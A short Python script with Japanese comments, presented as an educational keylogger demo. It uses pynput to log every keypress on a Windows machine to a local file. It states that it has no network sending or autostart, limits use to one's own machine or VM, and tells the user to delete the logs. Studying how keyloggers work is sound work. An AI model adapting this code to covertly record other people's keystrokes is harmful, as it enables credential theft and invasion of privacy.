"""キーロガーの仕組みを理解するための教育用デモ(PC側、Windows機で手動実行)。

【教育目的専用・利用範囲の厳守】
- 自分が所有・管理するWindows機、または隔離VM上でのみ実行すること。
- 他人のPC・共用PC・業務PCでの実行は絶対に行わないこと
  (不正アクセス禁止法・不正指令電磁的記録に関する罪に抵触しうる)。
- ネットワーク送信機能は一切実装していない。記録は手元のログファイルのみ。
- 実行はこのスクリプトを手動で起動した場合に限る(自動起動・常駐化はしない)。
- 確認が終わったら、記録された入力内容が残らないよう、
  生成されたログファイル(このファイルと同じディレクトリの `*.log`)を必ず削除すること。

使い方:
    python tools/keylogger_demo.py
    (Ctrl+C で記録を停止する)

事前に `pip install -r requirements-dev.txt` で pynput をインストールしておくこと。
"""

import datetime
import sys

try:
    from pynput import keyboard
except ImportError:
    print("pynputが見つかりません。`pip install -r requirements-dev.txt` を実行してください。")
    sys.exit(1)

ログファイル名 = "keylogger_demo_{}.log".format(
    datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
)


def キー押下時(key):
    try:
        文字 = key.char
    except AttributeError:
        文字 = "[{}]".format(key)

    ログ行 = "{} {}\n".format(datetime.datetime.now().isoformat(), 文字)
    with open(ログファイル名, "a", encoding="utf-8") as f:
        f.write(ログ行)


def main():
    print("=== キーロガーデモ 記録開始 ===")
    print("教育目的専用。自分のWindows機/隔離VM以外では絶対に実行しないこと。")
    print("記録先: {}".format(ログファイル名))
    print("停止するには Ctrl+C を押してください。")

    listener = keyboard.Listener(on_press=キー押下時)
    listener.start()
    try:
        listener.join()
    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        print("\n=== 記録終了 ===")
        print("確認が終わったら、必ず {} を削除してください。".format(ログファイル名))


if __name__ == "__main__":
    main()
